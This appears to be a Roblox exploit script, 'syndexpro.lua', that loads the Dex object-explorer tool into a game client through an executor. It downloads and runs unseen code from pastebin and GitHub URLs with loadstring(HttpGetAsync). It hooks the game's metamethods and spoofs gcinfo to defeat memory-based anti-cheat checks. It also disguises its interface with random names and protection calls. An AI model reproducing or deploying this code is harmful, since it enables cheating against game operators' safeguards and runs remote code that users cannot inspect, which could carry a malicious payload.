-- syndexpro.lua --

local function NSIK_fake_script()
local script = Instance.new('LocalScript')	
			
getgenv().Services = setmetatable({},{__index=function(s,r) return game:service(r) end})	
			
getgenv().Protector = loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/pamlib/prote.lua/ca01e9b8b3478762370d4a1d1ee65bae6ee881a3/main.lua"))
			
getgenv().confi = loadstring(game:HttpGetAsync("https://l8x.github.io/syndexpro/confi.lua"))

loadstring(game:HttpGetAsync("https://pastebin.com/raw/ri3pGiYz"))()	
			
loadstring(game:HttpGetAsync("https://pastebin.com/raw/AGBj7SXt"))


local OldIndex
OldIndex = hookmetamethod(game, "__index", function(Self, Index)
    return OldIndex(Self, Index)
end)

local OldNewIndex
OldNewIndex = hookmetamethod(game, "__newindex", function(Self, Index, Value)
    return OldNewIndex(Self, Index, Value)
end)

local OldNamecall
OldNamecall = hookmetamethod(game, "__namecall", function(Self, ...)
    return OldNamecall(Self, ...)
end)

local mt = getrawmetatable(game)

local old
old = hookfunction(mt.__namecall, function(...)
   return old(...)
end)


local function get_proxy_game_metatable(x)
 local proxy = {}
  local mt_func_list = {
    
 }
 local proxy_mt = {
    __newindex = function(t,k,v)
       local old
       old = hookmetamethod(game,k,v)
       mt_func_list[k] = old
     end;
      __index = function(t,k)
         return function(...)
             local list_func =  mt_func_list[k]
              local unpack_pcall = {pcall(list_func,...)}
           if unpack_pcall[1] == true then
                 table.remove(unpack_pcall,1)
              return unpack(unpack_pcall)
                end
          end
        end
  }
 return setmetatable(proxy,proxy_mt)
end
--hookfunction(getrawmetatable,get_proxy_game_metatable)

local memCheckBypass

memCheckBypass = hookfunction(getrenv().gcinfo, function(...)
   --warn("Script tried to memory check, PATH: \n"..debug.traceback())
   return tonumber(math.random(55-math.random(1,45), 110-math.random(1,35)*0.215-math.random(1, 45)))
end)

-- < Functions > --
function gethui()
return game:GetService("CoreGui") 
end

getgenv().yeetdex = function(yeetdex)
local CoreGui = game:GetService("CoreGui")
local RemoteDebugWindow = CoreGui:FindFirstChild("RemoteDebugWindow", true)
if RemoteDebugWindow then
    RemoteDebugWindow.Parent:Destroy()
end end

-- < Services > --	
local InsertService = Services.InsertService
local CoreGui = gethui()
-- < Aliases > --
local table_insert = table.insert
local table_foreach = table.foreach
local string_char = string.char
getgenv().getobjects = function(a)
    local Objects = {}
    if a then
        local b = InsertService:LoadLocalAsset(a)
        if b then 
            table_insert(Objects, b) 
        end
    end
    return Objects
end

-- < Values > --
local Charset = {}
local Random_Instance = Random.new()
local RemoteDebugWindow = CoreGui:FindFirstChild("RemoteDebugWindow", true)
-- < Source > --
if RemoteDebugWindow then
	RemoteDebugWindow.Parent:Destroy()
end

for i = 48,  57 do 
	table_insert(Charset, string_char(i))
end

for i = 65,  90 do 
	table_insert(Charset, string_char(i))
end

for i = 97, 122 do
	table_insert(Charset, string_char(i))
end

function RandomCharacters(length)
	return length > 0 and RandomCharacters(length - 1)..Charset[Random_Instance:NextInteger(1, #Charset)] or ""
end
			
local HTTPService = Services.HttpService
local CoreGui     = gethui()
local ScriptContext = Services.ScriptContext
local RandomObject = CoreGui:FindFirstChildOfClass("ScreenGui")
local RandomObject2 = RandomObject

local Dex = getobjects("rbxassetid://7995973532")[1]
Dex.Name = RandomCharacters(Random_Instance:NextInteger(5,20))
syn.protect_gui(Dex)

local function Load(Obj, Url)
	local function GiveOwnGlobals(Func, Script)
		local Fenv, RealFenv, FenvMt = {}, {script = Script}, {}
		FenvMt.__index = function(a,b)
			return RealFenv[b] == nil and getgenv()[b] or RealFenv[b]
		end
		FenvMt.__newindex = function(a, b, c)
			if RealFenv[b] == nil then 
				getgenv()[b] = c
		else 
			RealFenv[b] = c 
			end
		end
		setmetatable(Fenv, FenvMt)
		pcall(setfenv, Func, Fenv)
		return Func
	end
	local function LoadScripts(_, Script)
		if Script:IsA("LocalScript") then
			spawn(function()
				GiveOwnGlobals(loadstring(Script.Source,"="..Script:GetFullName()), Script)()
			end)
		end
		table_foreach(Script:GetChildren(), LoadScripts)
	end
LoadScripts(nil, Obj)
end
sethiddenproperty(Dex, "OnTopOfCoreBlur", true)

Load(Dex)
syn.protect_gui(Dex)
Protector():ProtectInstance(Dex, true)
Protector():ProtectInstance(RandomObject2, true)
Dex.Parent = RandomObject2
syn.protect_gui(Dex.Parent)
do confi()
end
coroutine.wrap(NSIK_fake_script)()
end
